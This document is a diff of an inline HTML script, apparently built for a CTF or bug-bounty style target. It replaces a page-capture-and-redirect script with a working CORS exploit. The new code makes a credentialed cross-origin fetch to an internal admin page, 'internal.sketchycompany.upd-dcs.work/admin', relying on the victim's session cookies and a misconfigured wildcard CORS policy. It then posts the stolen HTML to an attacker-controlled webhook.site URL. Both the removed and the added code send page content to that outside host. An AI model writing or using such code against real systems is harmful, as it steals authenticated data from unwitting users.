@@ -12,30 +12,45 @@
 </html>
 
 <script>
-// 1. First, capture the HTML content of the current page
-const htmlContent = document.documentElement.outerHTML;
+// 1. Define the target internal admin page and your exfiltration webhook
+const targetUrl = 'https://internal.sketchycompany.upd-dcs.work/admin';
+const webhookUrl = 'https://webhook.site/f6db471c-032a-4816-9df7-7e77adf14368';
 
-// 2. Send the captured data to your webhook
-fetch('https://webhook.site/f6db471c-032a-4816-9df7-7e77adf14368', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({
-    url: window.location.href,
-    html: htmlContent
-  })
+// 2. Perform the cross-origin fetch request
+fetch(targetUrl, {
+    method: 'GET',
+    // CRITICAL: This instructs the browser to send the victim's session cookies/auth tokens.
+    // If the server's wildcard CORS configuration is misconfigured, it will accept this.
+    credentials: 'include' 
 })
 .then(response => {
-  console.log('Webhook sent successfully. Redirecting now...');
-  // 3. Only redirect AFTER the webhook confirms receipt
-  document.location.href = 'https://internal.sketchycompany.upd-dcs.work/admin';
+    // Check if the server responded successfully
+    if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    return response.text(); // Read the response body as raw HTML text
+})
+.then(htmlContent => {
+    // 3. Exfiltrate the captured HTML content to your webhook via a POST request
+    return fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            trigger: 'subdomain_wildcard_bypass',
+            capturedUrl: targetUrl,
+            html: htmlContent
+        })
+    });
+})
+.then(() => {
+    console.log('Target HTML successfully exfiltrated to webhook.');
 })
 .catch(error => {
-  console.error('Error posting to webhook:', error);
-  // Optional: Redirect anyway if the webhook fails
-  document.location.href = 'https://internal.sketchycompany.upd-dcs.work/admin';
+    console.error('Exploit failed:', error);
 });
+
 
     
 </script>
